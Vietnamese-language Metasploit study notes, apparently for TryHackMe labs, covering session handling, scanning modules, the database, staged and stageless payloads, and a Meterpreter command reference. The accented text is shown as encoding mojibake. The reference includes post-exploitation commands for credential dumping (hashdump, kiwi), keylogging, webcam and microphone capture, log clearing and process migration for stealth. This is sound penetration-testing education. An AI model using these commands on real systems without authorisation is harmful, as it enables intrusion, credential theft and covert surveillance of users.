Khi Ä‘Ã£ chiáº¿m Ä‘Æ°á»£c quyá»n Ä‘iá»u khiá»ƒn, báº¡n cáº§n cÃ¡c lá»‡nh nÃ y Ä‘á»ƒ quáº£n lÃ½ káº¿t ná»‘i.



**sessions**

* CÃ´ng dá»¥ng: Liá»‡t kÃª táº¥t cáº£ cÃ¡c phiÃªn (session) Ä‘ang hoáº¡t Ä‘á»™ng mÃ  báº¡n cÃ³.



**sessions -i \[ID]**

* CÃ´ng dá»¥ng: TÆ°Æ¡ng tÃ¡c vÃ  nháº£y vÃ o má»™t session cá»¥ thá»ƒ. ID lÃ  con sá»‘ báº¡n tháº¥y tá»« lá»‡nh sessions.
* VÃ­ dá»¥: sessions -i 1



**background**

* CÃ´ng dá»¥ng: ÄÆ°a session hiá»‡n táº¡i cháº¡y á»Ÿ cháº¿ Ä‘á»™ ná»n Ä‘á»ƒ báº¡n quay láº¡i msfconsole vÃ  lÃ m viá»‡c khÃ¡c (vÃ­ dá»¥: táº¥n cÃ´ng má»™t mÃ¡y khÃ¡c). Báº¡n cÃ³ thá»ƒ quay láº¡i session nÃ y báº¥t cá»© lÃºc nÃ o báº±ng sessions -i.
* PhÃ­m táº¯t: Ctrl + Z cÅ©ng cÃ³ tÃ¡c dá»¥ng tÆ°Æ¡ng tá»±.



**ğŸš€ 4. CÃ¡c Lá»‡nh Meterpreter Phá»• Biáº¿n**

Khi báº¡n Ä‘Ã£ á»Ÿ bÃªn trong má»™t session Meterpreter, Ä‘Ã¢y khÃ´ng cÃ²n lÃ  lá»‡nh cá»§a msfconsole ná»¯a, mÃ  lÃ  cÃ¡c lá»‡nh cá»§a chÃ­nh Meterpreter Ä‘á»ƒ tÆ°Æ¡ng tÃ¡c vá»›i mÃ¡y náº¡n nhÃ¢n.

* **sysinfo** : Láº¥y thÃ´ng tin há»‡ thá»‘ng cá»§a mÃ¡y náº¡n nhÃ¢n.
* **getuid** : Cho biáº¿t báº¡n Ä‘ang lÃ  ngÆ°á»i dÃ¹ng (user) nÃ o trÃªn há»‡ thá»‘ng Ä‘Ã³.
* **ps** : Liá»‡t kÃª cÃ¡c tiáº¿n trÃ¬nh Ä‘ang cháº¡y.
* **migrate \[PID]** : Di chuyá»ƒn Meterpreter vÃ o má»™t tiáº¿n trÃ¬nh khÃ¡c (vÃ­ dá»¥ explorer.exe) Ä‘á»ƒ che giáº¥u vÃ  duy trÃ¬ káº¿t ná»‘i.
* **upload \[file\_cá»§a\_báº¡n]** : Táº£i file tá»« mÃ¡y báº¡n lÃªn mÃ¡y náº¡n nhÃ¢n.
* **download \[file\_trÃªn\_mÃ¡y\_náº¡n\_nhÃ¢n]** : Táº£i file tá»« mÃ¡y náº¡n nhÃ¢n vá» mÃ¡y báº¡n.
* **shell** : Má»Ÿ má»™t giao diá»‡n dÃ²ng lá»‡nh (shell) cÆ¡ báº£n cá»§a há»‡ Ä‘iá»u hÃ nh náº¡n nhÃ¢n.
* **getsystem** : Cá»‘ gáº¯ng leo thang Ä‘áº·c quyá»n lÃªn má»©c cao nháº¥t (SYSTEM trÃªn Windows).

# 

# Metasploit: Khai thÃ¡c

#### QuÃ©t :

###### **QuÃ©t cá»•ng**

Metasploit cÃ³ má»™t sá»‘ mÃ´-Ä‘un Ä‘á»ƒ quÃ©t cÃ¡c cá»•ng má»Ÿ trÃªn há»‡ thá»‘ng vÃ  máº¡ng Ä‘Ã­ch. Báº¡n cÃ³ thá»ƒ liá»‡t kÃª cÃ¡c mÃ´-Ä‘un quÃ©t cá»•ng tiá»m nÄƒng báº±ng search portscan lá»‡nh.

CÃ¡c mÃ´-Ä‘un quÃ©t cá»•ng sáº½ yÃªu cáº§u báº¡n thiáº¿t láº­p má»™t sá»‘ tÃ¹y chá»n:

* Äá»’NG THá»œI(CONCURRENCY): Sá»‘ lÆ°á»£ng má»¥c tiÃªu Ä‘Æ°á»£c quÃ©t Ä‘á»“ng thá»i.
* Cá»”NG(PORTS): Pháº¡m vi cá»•ng cáº§n quÃ©t. Xin lÆ°u Ã½ ráº±ng pháº¡m vi 1-1000 á»Ÿ Ä‘Ã¢y sáº½ khÃ´ng giá»‘ng vá»›i pháº¡m vi sá»­ dá»¥ng Nmap vá»›i cáº¥u hÃ¬nh máº·c Ä‘á»‹nh. Nmap sáº½ quÃ©t 1000 cá»•ng Ä‘Æ°á»£c sá»­ dá»¥ng nhiá»u nháº¥t, trong khi Metasploit sáº½ quÃ©t sá»‘ cá»•ng tá»« 1 Ä‘áº¿n 10000.
* RHOSTS: Má»¥c tiÃªu hoáº·c máº¡ng má»¥c tiÃªu cáº§n quÃ©t.
* CHá»¦ Äá»€(THREAD): Sá»‘ luá»“ng sáº½ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»“ng thá»i. Nhiá»u luá»“ng hÆ¡n sáº½ giÃºp quÃ©t nhanh hÆ¡n.



Báº¡n cÃ³ thá»ƒ trá»±c tiáº¿p thá»±c hiá»‡n quÃ©t Nmap tá»« dáº¥u nháº¯c msfconsole



###### **Nháº­n dáº¡ng dá»‹ch vá»¥ UDP**

MÃ´-Ä‘un nÃ y **scanner/discovery/udp\_sweep** sáº½ cho phÃ©p báº¡n nhanh chÃ³ng xÃ¡c Ä‘á»‹nh cÃ¡c dá»‹ch vá»¥ Ä‘ang cháº¡y trÃªn UDP (Giao thá»©c dá»¯ liá»‡u ngÆ°á»i dÃ¹ng). NhÆ° báº¡n cÃ³ thá»ƒ tháº¥y bÃªn dÆ°á»›i, mÃ´-Ä‘un nÃ y sáº½ khÃ´ng quÃ©t toÃ n bá»™ táº¥t cáº£ cÃ¡c dá»‹ch vá»¥ UDP cÃ³ thá»ƒ cÃ³ nhÆ°ng cung cáº¥p má»™t cÃ¡ch nhanh chÃ³ng Ä‘á»ƒ xÃ¡c Ä‘á»‹nh cÃ¡c dá»‹ch vá»¥ nhÆ° DNS hoáº·c NetBIOS .



###### **QuÃ©t SMB**

Metasploit cung cáº¥p má»™t sá»‘ mÃ´-Ä‘un bá»• trá»£ há»¯u Ã­ch cho phÃ©p chÃºng ta quÃ©t cÃ¡c dá»‹ch vá»¥ cá»¥ thá»ƒ. DÆ°á»›i Ä‘Ã¢y lÃ  má»™t vÃ­ dá»¥ dÃ nh cho doanh nghiá»‡p vá»«a vÃ  nhá» (SMB) . Äáº·c biá»‡t há»¯u Ã­ch trong máº¡ng doanh nghiá»‡p smb\_enumshares , smb\_version nhÆ°ng hÃ£y dÃ nh thá»i gian Ä‘á»ƒ xÃ¡c Ä‘á»‹nh cÃ¡c trÃ¬nh quÃ©t mÃ  phiÃªn báº£n Metasploit Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn há»‡ thá»‘ng cá»§a báº¡n cung cáº¥p.



#### CÆ¡ sá»Ÿ dá»¯ liá»‡u Metasploit :

Viá»‡c káº¿t ná»‘i Metasploit vá»›i má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (thÆ°á»ng lÃ  PostgreSQL) mang láº¡i nhiá»u lá»£i Ã­ch lá»›n:

* Quáº£n lÃ½ táº­p trung: Táº¥t cáº£ thÃ´ng tin vá» má»¥c tiÃªuâ€”nhÆ° Ä‘á»‹a chá»‰ IP, cÃ¡c cá»•ng Ä‘ang má»Ÿ, dá»‹ch vá»¥ Ä‘ang cháº¡y, vÃ  cÃ¡c lá»— há»•ng Ä‘Ã£ phÃ¡t hiá»‡nâ€”Ä‘á»u Ä‘Æ°á»£c lÆ°u trá»¯ á»Ÿ má»™t nÆ¡i.
* TÄƒng tá»‘c Ä‘á»™: Viá»‡c tÃ¬m kiáº¿m vÃ  lá»c thÃ´ng tin trong database nhanh hÆ¡n ráº¥t nhiá»u so vá»›i viá»‡c quÃ©t láº¡i tá»« Ä‘áº§u.
* Tá»± Ä‘á»™ng hÃ³a: Nhiá»u module cá»§a Metasploit cÃ³ thá»ƒ tá»± Ä‘á»™ng láº¥y thÃ´ng tin tá»« database Ä‘á»ƒ Ä‘iá»n vÃ o cÃ¡c tÃ¹y chá»n (vÃ­ dá»¥: tá»± Ä‘á»™ng láº¥y RHOSTS tá»« danh sÃ¡ch mÃ¡y chá»§ Ä‘Ã£ quÃ©t).
* LÆ°u trá»¯ báº±ng chá»©ng: Báº¡n cÃ³ thá»ƒ lÆ°u láº¡i "loot" (dá»¯ liá»‡u chiáº¿m Ä‘Æ°á»£c nhÆ° password hash, file nháº¡y cáº£m) vÃ  cÃ¡c thÃ´ng tin quan trá»ng khÃ¡c.



###### **CÃ¡c Lá»‡nh CÆ¡ Báº£n vÃ  Quan Trá»ng âš™ï¸**

ÄÃ¢y lÃ  nhá»¯ng lá»‡nh báº¡n sáº½ sá»­ dá»¥ng thÆ°á»ng xuyÃªn nháº¥t khi lÃ m viá»‡c vá»›i database trong msfconsole.



1\. Lá»‡nh Quáº£n LÃ½ Káº¿t Ná»‘i

**db\_status**

* CÃ´ng dá»¥ng: Kiá»ƒm tra tráº¡ng thÃ¡i káº¿t ná»‘i tá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u. ÄÃ¢y lÃ  lá»‡nh Ä‘áº§u tiÃªn báº¡n nÃªn cháº¡y Ä‘á»ƒ xem Metasploit Ä‘Ã£ káº¿t ná»‘i database hay chÆ°a.
* VÃ­ dá»¥: msf6 > db\_status

\[\*] postgresql connected to msf (ÄÃ£ káº¿t ná»‘i thÃ nh cÃ´ng)



**db\_connect**

* CÃ´ng dá»¥ng: DÃ¹ng Ä‘á»ƒ káº¿t ná»‘i thá»§ cÃ´ng tá»›i má»™t database. (ThÃ´ng thÆ°á»ng trÃªn Kali Linux, viá»‡c nÃ y Ä‘Ã£ Ä‘Æ°á»£c cáº¥u hÃ¬nh sáºµn).



**db\_disconnect**

* CÃ´ng dá»¥ng: Ngáº¯t káº¿t ná»‘i khá»i database hiá»‡n táº¡i.



2\. Lá»‡nh Quáº£n LÃ½ KhÃ´ng Gian LÃ m Viá»‡c (Workspace)

Workspace cho phÃ©p báº¡n chia nhá» cÃ¡c dá»± Ã¡n pentest. Má»—i workspace lÃ  má»™t database riÃªng biá»‡t, giÃºp báº¡n khÃ´ng bá»‹ láº«n lá»™n thÃ´ng tin giá»¯a cÃ¡c má»¥c tiÃªu khÃ¡c nhau.



**workspace**

* CÃ´ng dá»¥ng: Liá»‡t kÃª táº¥t cáº£ cÃ¡c workspace hiá»‡n cÃ³. Workspace Ä‘ang hoáº¡t Ä‘á»™ng sáº½ cÃ³ dáº¥u \* bÃªn cáº¡nh.
* VÃ­ dá»¥: msf6 > workspace



**workspace -a \[tÃªn\_workspace]**

* CÃ´ng dá»¥ng: ThÃªm (-a for add) má»™t workspace má»›i.
* VÃ­ dá»¥: msf6 > workspace -a tryhackme\_project



**workspace \[tÃªn\_workspace]**

* CÃ´ng dá»¥ng: Chuyá»ƒn sang má»™t workspace khÃ¡c.
* VÃ­ dá»¥: msf6 > workspace tryhackme\_project



3\. Lá»‡nh TÆ°Æ¡ng TÃ¡c Vá»›i Dá»¯ Liá»‡u

ÄÃ¢y lÃ  cÃ¡c lá»‡nh dÃ¹ng Ä‘á»ƒ nháº­p vÃ  xem dá»¯ liá»‡u Ä‘Ã£ thu tháº­p.



**db\_nmap \[cÃ¡c\_tÃ¹y\_chá»n\_cá»§a\_Nmap]**

* CÃ´ng dá»¥ng: Cháº¡y Nmap ngay tá»« trong Metasploit vÃ  tá»± Ä‘á»™ng lÆ°u káº¿t quáº£ vÃ o database. ÄÃ¢y lÃ  cÃ¡ch tá»‘t nháº¥t Ä‘á»ƒ báº¯t Ä‘áº§u thu tháº­p thÃ´ng tin.
* VÃ­ dá»¥: msf6 > db\_nmap -sV -A 10.10.123.45



**hosts**

* CÃ´ng dá»¥ng: Liá»‡t kÃª táº¥t cáº£ cÃ¡c mÃ¡y chá»§ (hosts) Ä‘Ã£ Ä‘Æ°á»£c phÃ¡t hiá»‡n vÃ  lÆ°u trong workspace hiá»‡n táº¡i.
* VÃ­ dá»¥: msf6 > hosts



**services**

* CÃ´ng dá»¥ng: Liá»‡t kÃª táº¥t cáº£ cÃ¡c dá»‹ch vá»¥ vÃ  cá»•ng Ä‘ang má»Ÿ trÃªn cÃ¡c mÃ¡y chá»§ Ä‘Ã£ quÃ©t.
* VÃ­ dá»¥: msf6 > services



**vulns**

* CÃ´ng dá»¥ng: Liá»‡t kÃª cÃ¡c lá»— há»•ng tiá»m nÄƒng Ä‘Ã£ Ä‘Æ°á»£c phÃ¡t hiá»‡n (thÆ°á»ng lÃ  tá»« cÃ¡c module scanner).
* VÃ­ dá»¥: msf6 > vulns



**loot**

* CÃ´ng dá»¥ng: Hiá»ƒn thá»‹ cÃ¡c dá»¯ liá»‡u quan trá»ng (máº­t kháº©u, hash, key,...) mÃ  báº¡n Ä‘Ã£ chiáº¿m Ä‘Æ°á»£c vÃ  lÆ°u láº¡i.
* VÃ­ dá»¥: msf6 > loot



#### Payloads

**## Payload: "HÃ ng HÃ³a" ÄÆ°á»£c Gá»­i Tá»›i Má»¥c TiÃªu ğŸ“¦**

Payload lÃ  Ä‘oáº¡n mÃ£ sáº½ Ä‘Æ°á»£c thá»±c thi trÃªn mÃ¡y náº¡n nhÃ¢n sau khi lá»— há»•ng Ä‘Ã£ Ä‘Æ°á»£c khai thÃ¡c thÃ nh cÃ´ng. Má»¥c tiÃªu cá»§a exploit lÃ  Ä‘á»ƒ cháº¡y Ä‘Æ°á»£c payload.

Metasploit chia Payloads thÃ nh cÃ¡c loáº¡i khÃ¡c nhau, nhÆ°ng báº¡n chá»‰ cáº§n táº­p trung vÃ o 2 loáº¡i chÃ­nh lÃ  Staged (Theo Giai Äoáº¡n) vÃ  Stageless (Äá»™c Láº­p).



**## 1. Stageless Payloads (Payload Äá»™c Láº­p / Inline)**

Äáº·c Ä‘iá»ƒm: ToÃ n bá»™ payload náº±m trong má»™t khá»‘i duy nháº¥t. NÃ³ chá»©a táº¥t cáº£ má»i thá»© cáº§n thiáº¿t Ä‘á»ƒ hoáº¡t Ä‘á»™ng ngay láº­p tá»©c.

Æ¯u Ä‘iá»ƒm:

á»”n Ä‘á»‹nh: VÃ¬ chá»‰ cÃ³ má»™t káº¿t ná»‘i duy nháº¥t nÃªn nÃ³ Ä‘Ã¡ng tin cáº­y hÆ¡n.



NhÆ°á»£c Ä‘iá»ƒm:

KÃ­ch thÆ°á»›c lá»›n: Dá»… bá»‹ cÃ¡c há»‡ thá»‘ng phÃ²ng thá»§ phÃ¡t hiá»‡n vÃ  cháº·n láº¡i vÃ¬ kÃ­ch thÆ°á»›c file lá»›n vÃ  báº¥t thÆ°á»ng.



Khi nÃ o dÃ¹ng: Khi báº¡n khÃ´ng quÃ¡ lo láº¯ng vá» viá»‡c bá»‹ phÃ¡t hiá»‡n, hoáº·c khi má»¥c tiÃªu cÃ³ káº¿t ná»‘i máº¡ng khÃ´ng á»•n Ä‘á»‹nh.



TÃªn gá»i: ThÆ°á»ng cÃ³ tá»« \_inline hoáº·c khÃ´ng cÃ³ dáº¥u gáº¡ch chÃ©o á»Ÿ giá»¯a tÃªn (vÃ­ dá»¥ windows/x64/shell\_reverse\_tcp).



**## 2. Staged Payloads (Payload Theo Giai Äoáº¡n) - Quan Trá»ng \& Phá»• Biáº¿n Nháº¥t!**

ÄÃ¢y lÃ  loáº¡i payload Ä‘Æ°á»£c sá»­ dá»¥ng nhiá»u nháº¥t vÃ  lÃ  cÃ¡ch hoáº¡t Ä‘á»™ng máº·c Ä‘á»‹nh cá»§a Meterpreter. NÃ³ hoáº¡t Ä‘á»™ng theo 2 bÆ°á»›c:

Stager (NgÆ°á»i Giao HÃ ng): Má»™t Ä‘oáº¡n mÃ£ cá»±c ká»³ nhá» vÃ  Ä‘Æ¡n giáº£n Ä‘Æ°á»£c gá»­i Ä‘i trÆ°á»›c. Nhiá»‡m vá»¥ duy nháº¥t cá»§a nÃ³ lÃ  Ä‘á»™t nháº­p vÃ o mÃ¡y náº¡n nhÃ¢n, thiáº¿t láº­p má»™t kÃªnh káº¿t ná»‘i vá» mÃ¡y cá»§a báº¡n, sau Ä‘Ã³ "gá»i Ä‘iá»‡n vá» nhÃ " Ä‘á»ƒ yÃªu cáº§u gá»­i pháº§n cÃ²n láº¡i.



Stage (GÃ³i HÃ ng Lá»›n): Sau khi Stager káº¿t ná»‘i thÃ nh cÃ´ng, mÃ¡y cá»§a báº¡n sáº½ gá»­i Ä‘i pháº§n payload chÃ­nh (Stage), vÃ­ dá»¥ nhÆ° toÃ n bá»™ Meterpreter.



Æ¯u Ä‘iá»ƒm:

TÃ ng hÃ¬nh: Stager ráº¥t nhá» nÃªn cÃ³ kháº£ nÄƒng cao vÆ°á»£t qua Ä‘Æ°á»£c cÃ¡c há»‡ thá»‘ng phÃ²ng thá»§ (IDS/IPS/Antivirus).

Linh hoáº¡t: Báº¡n cÃ³ thá»ƒ dá»… dÃ ng thay Ä‘á»•i Stage mÃ  khÃ´ng cáº§n thay Ä‘á»•i exploit.



NhÆ°á»£c Ä‘iá»ƒm:

Phá»¥ thuá»™c káº¿t ná»‘i: Cáº§n nhiá»u káº¿t ná»‘i nÃªn Ä‘Ã´i khi khÃ´ng á»•n Ä‘á»‹nh.



TÃªn gá»i: TÃªn cá»§a chÃºng thÆ°á»ng cÃ³ dáº¥u gáº¡ch chÃ©o / Ä‘á»ƒ phÃ¢n tÃ¡ch Stager vÃ  Stage.



**## Giáº£i MÃ£ TÃªn Gá»i Cá»§a Payload**

Hiá»ƒu Ä‘Æ°á»£c cÃ¡ch Ä‘áº·t tÃªn sáº½ giÃºp báº¡n chá»n payload cá»±c nhanh. VÃ­ dá»¥: windows/x64/meterpreter/reverse\_tcp

windows: Há»‡ Ä‘iá»u hÃ nh má»¥c tiÃªu.

x64: Kiáº¿n trÃºc CPU (x64 hoáº·c x86).

meterpreter: ÄÃ¢y lÃ  Stage (pháº§n payload chÃ­nh sáº½ Ä‘Æ°á»£c táº£i vá»).

reverse\_tcp: ÄÃ¢y lÃ  Stager. NÃ³ cho biáº¿t cÃ¡ch Stager sáº½ káº¿t ná»‘i.

reverse\_tcp: MÃ¡y náº¡n nhÃ¢n chá»§ Ä‘á»™ng káº¿t ná»‘i vá» mÃ¡y cá»§a báº¡n. ÄÃ¢y lÃ  lá»±a chá»n phá»• biáº¿n nháº¥t vÃ¬ nÃ³ cÃ³ thá»ƒ vÆ°á»£t qua tÆ°á»ng lá»­a.

bind\_tcp: MÃ¡y cá»§a báº¡n chá»§ Ä‘á»™ng káº¿t ná»‘i tá»›i mÃ¡y náº¡n nhÃ¢n. CÃ¡ch nÃ y Ã­t dÃ¹ng hÆ¡n vÃ¬ thÆ°á»ng bá»‹ tÆ°á»ng lá»­a cá»§a má»¥c tiÃªu cháº·n láº¡i.



#### Meterpreter

###### **## Meterpreter LÃ  GÃ¬? ğŸš€**

Meterpreter lÃ  má»™t "shell" nÃ¢ng cao, cho phÃ©p báº¡n Ä‘iá»u khiá»ƒn mÃ¡y náº¡n nhÃ¢n má»™t cÃ¡ch máº¡nh máº½ vÃ  kÃ­n Ä‘Ã¡o sau khi Ä‘Ã£ khai thÃ¡c thÃ nh cÃ´ng. NÃ³ khÃ´ng pháº£i lÃ  má»™t command prompt (cmd) hay bash shell thÃ´ng thÆ°á»ng.



###### **## Táº¡i Sao Meterpreter Láº¡i Äáº·c Biá»‡t?**

NÃ³ vÆ°á»£t trá»™i hÆ¡n má»™t shell thÃ´ng thÆ°á»ng á»Ÿ ráº¥t nhiá»u Ä‘iá»ƒm:

* Hoáº¡t Ä‘á»™ng hoÃ n toÃ n trong bá»™ nhá»› (In-memory): ÄÃ¢y lÃ  Æ°u Ä‘iá»ƒm lá»›n nháº¥t. Meterpreter Ä‘Æ°á»£c tiÃªm tháº³ng vÃ o má»™t tiáº¿n trÃ¬nh Ä‘ang cháº¡y trÃªn mÃ¡y náº¡n nhÃ¢n vÃ  khÃ´ng ghi báº¥t ká»³ file nÃ o xuá»‘ng á»• cá»©ng. Äiá»u nÃ y giÃºp nÃ³ nÃ© trÃ¡nh háº§u háº¿t cÃ¡c pháº§n má»m diá»‡t virus truyá»n thá»‘ng, vá»‘n thÆ°á»ng quÃ©t cÃ¡c file trÃªn Ä‘Ä©a.
* Giao tiáº¿p mÃ£ hÃ³a: Má»i lá»‡nh báº¡n gá»­i vÃ  má»i káº¿t quáº£ tráº£ vá» giá»¯a mÃ¡y báº¡n vÃ  mÃ¡y náº¡n nhÃ¢n Ä‘á»u Ä‘Æ°á»£c mÃ£ hÃ³a. Äiá»u nÃ y khiáº¿n cÃ¡c cÃ´ng cá»¥ giÃ¡m sÃ¡t máº¡ng (nhÆ° Wireshark) ráº¥t khÃ³ phÃ¡t hiá»‡n ra báº¡n Ä‘ang lÃ m gÃ¬.
* Kháº£ nÄƒng má»Ÿ rá»™ng (Extensible): Meterpreter cÃ³ cáº¥u trÃºc module. Báº¡n cÃ³ thá»ƒ táº£i thÃªm cÃ¡c pháº§n má»Ÿ rá»™ng ngay trong session Ä‘á»ƒ cÃ³ thÃªm tÃ­nh nÄƒng má»›i mÃ  khÃ´ng cáº§n pháº£i ngáº¯t káº¿t ná»‘i. 
* VÃ­ dá»¥:

stdapi: CÃ¡c lá»‡nh há»‡ thá»‘ng cÆ¡ báº£n (quáº£n lÃ½ file, tiáº¿n trÃ¬nh).

priv: CÃ¡c lá»‡nh dÃ¹ng Ä‘á»ƒ leo thang Ä‘áº·c quyá»n (getsystem).

kiwi: Module Mimikatz ná»•i tiáº¿ng Ä‘á»ƒ trÃ­ch xuáº¥t máº­t kháº©u tá»« bá»™ nhá»›.

* Äa ná»n táº£ng: CÃ¹ng má»™t giao diá»‡n Meterpreter nhÆ°ng nÃ³ cÃ³ thá»ƒ hoáº¡t Ä‘á»™ng trÃªn Windows, Linux, vÃ  cÃ¡c há»‡ Ä‘iá»u hÃ nh khÃ¡c, giÃºp báº¡n khÃ´ng cáº§n pháº£i há»c láº¡i lá»‡nh cho tá»«ng mÃ´i trÆ°á»ng.



###### **## CÃ¡c Lá»‡nh Meterpreter Báº¡n Pháº£i Biáº¿t**

CÃ¡c lá»‡nh cá»‘t lÃµi

* background: Bá»‘i cáº£nh cá»§a phiÃªn hiá»‡n táº¡i
* exit: Káº¿t thÃºc phiÃªn Meterpreter
* guid: Láº¥y GUID phiÃªn (MÃ£ Ä‘á»‹nh danh duy nháº¥t toÃ n cáº§u)
* help: Hiá»ƒn thá»‹ menu trá»£ giÃºp
* info: Hiá»ƒn thá»‹ thÃ´ng tin vá» mÃ´-Ä‘un Post
* irb: Má»Ÿ má»™t shell Ruby tÆ°Æ¡ng tÃ¡c trÃªn phiÃªn hiá»‡n táº¡i
* load: Táº£i má»™t hoáº·c nhiá»u tiá»‡n Ã­ch má»Ÿ rá»™ng Meterpreter
* migrate: Cho phÃ©p báº¡n di chuyá»ƒn Meterpreter sang má»™t tiáº¿n trÃ¬nh khÃ¡c
* run: Thá»±c thi táº­p lá»‡nh Meterpreter hoáº·c mÃ´-Ä‘un Post
* sessions: Nhanh chÃ³ng chuyá»ƒn sang phiÃªn khÃ¡c



Lá»‡nh há»‡ thá»‘ng táº­p tin

* cd: Sáº½ thay Ä‘á»•i thÆ° má»¥c
* ls: Sáº½ liá»‡t kÃª cÃ¡c táº­p tin trong thÆ° má»¥c hiá»‡n táº¡i (dir cÅ©ng sáº½ hoáº¡t Ä‘á»™ng)
* pwd: In thÆ° má»¥c lÃ m viá»‡c hiá»‡n táº¡i
* edit: sáº½ cho phÃ©p báº¡n chá»‰nh sá»­a má»™t táº­p tin
* cat: Sáº½ hiá»ƒn thá»‹ ná»™i dung cá»§a má»™t táº­p tin trÃªn mÃ n hÃ¬nh
* rm: Sáº½ xÃ³a táº­p tin Ä‘Ã£ chá»‰ Ä‘á»‹nh
* search: Sáº½ tÃ¬m kiáº¿m cÃ¡c táº­p tin
* upload: Sáº½ táº£i lÃªn má»™t táº­p tin hoáº·c thÆ° má»¥c
* download: Sáº½ táº£i xuá»‘ng má»™t táº­p tin hoáº·c thÆ° má»¥c



Lá»‡nh máº¡ng

* arp: Hiá»ƒn thá»‹ bá»™ nhá»› Ä‘á»‡m ARP (Giao thá»©c phÃ¢n giáº£i Ä‘á»‹a chá»‰) cá»§a mÃ¡y chá»§
* ifconfig: Hiá»ƒn thá»‹ cÃ¡c giao diá»‡n máº¡ng cÃ³ sáºµn trÃªn há»‡ thá»‘ng Ä‘Ã­ch
* netstat: Hiá»ƒn thá»‹ cÃ¡c káº¿t ná»‘i máº¡ng
* portfwd: Chuyá»ƒn tiáº¿p má»™t cá»•ng cá»¥c bá»™ Ä‘áº¿n má»™t dá»‹ch vá»¥ tá»« xa
* route: Cho phÃ©p báº¡n xem vÃ  sá»­a Ä‘á»•i báº£ng Ä‘á»‹nh tuyáº¿n



Lá»‡nh há»‡ thá»‘ng

* clearev: XÃ³a nháº­t kÃ½ sá»± kiá»‡n
* execute: Thá»±c hiá»‡n má»™t lá»‡nh
* getpid: Hiá»ƒn thá»‹ mÃ£ Ä‘á»‹nh danh quy trÃ¬nh hiá»‡n táº¡i
* getuid: Hiá»ƒn thá»‹ cho ngÆ°á»i dÃ¹ng ráº±ng Meterpreter Ä‘ang cháº¡y nhÆ°
* kill: Káº¿t thÃºc má»™t tiáº¿n trÃ¬nh
* pkill: Káº¿t thÃºc tiáº¿n trÃ¬nh theo tÃªn
* ps: Liá»‡t kÃª cÃ¡c tiáº¿n trÃ¬nh Ä‘ang cháº¡y
* reboot: Khá»Ÿi Ä‘á»™ng láº¡i mÃ¡y tÃ­nh tá»« xa
* shell: Tháº£ vÃ o má»™t shell lá»‡nh há»‡ thá»‘ng
* shutdown: Táº¯t mÃ¡y tÃ­nh tá»« xa
* sysinfo: Láº¥y thÃ´ng tin vá» há»‡ thá»‘ng tá»« xa, cháº³ng háº¡n nhÆ° há»‡ Ä‘iá»u hÃ nh



CÃ¡c lá»‡nh khÃ¡c (cÃ¡c lá»‡nh nÃ y sáº½ Ä‘Æ°á»£c liá»‡t kÃª trong cÃ¡c danh má»¥c menu khÃ¡c nhau trong menu trá»£ giÃºp)

* idletime: Tráº£ vá» sá»‘ giÃ¢y ngÆ°á»i dÃ¹ng tá»« xa khÃ´ng hoáº¡t Ä‘á»™ng
* keyscan\_dump: XÃ³a bá»™ Ä‘á»‡m phÃ­m táº¯t
* keyscan\_start: Báº¯t Ä‘áº§u ghi láº¡i cÃ¡c láº§n nháº¥n phÃ­m
* keyscan\_stop: Dá»«ng ghi láº¡i cÃ¡c láº§n nháº¥n phÃ­m
* screenshare: Cho phÃ©p báº¡n theo dÃµi mÃ n hÃ¬nh mÃ¡y tÃ­nh cá»§a ngÆ°á»i dÃ¹ng tá»« xa theo thá»i gian thá»±c
* screenshot: Chá»¥p áº£nh mÃ n hÃ¬nh mÃ¡y tÃ­nh Ä‘á»ƒ bÃ n tÆ°Æ¡ng tÃ¡c
* record\_mic: Ghi Ã¢m thanh tá»« micrÃ´ máº·c Ä‘á»‹nh trong X giÃ¢y
* webcam\_chat: Báº¯t Ä‘áº§u trÃ² chuyá»‡n video
* webcam\_list: Liá»‡t kÃª cÃ¡c webcam
* webcam\_snap: Chá»¥p áº£nh nhanh tá»« webcam Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh
* webcam\_stream: PhÃ¡t luá»“ng video tá»« webcam Ä‘Ã£ chá»‰ Ä‘á»‹nh
* getsystem: Cá»‘ gáº¯ng nÃ¢ng cao Ä‘áº·c quyá»n cá»§a báº¡n lÃªn ngang báº±ng vá»›i há»‡ thá»‘ng Ä‘á»‹a phÆ°Æ¡ng
* hashdump: Äá»• ná»™i dung cá»§a cÆ¡ sá»Ÿ dá»¯ liá»‡u SAM
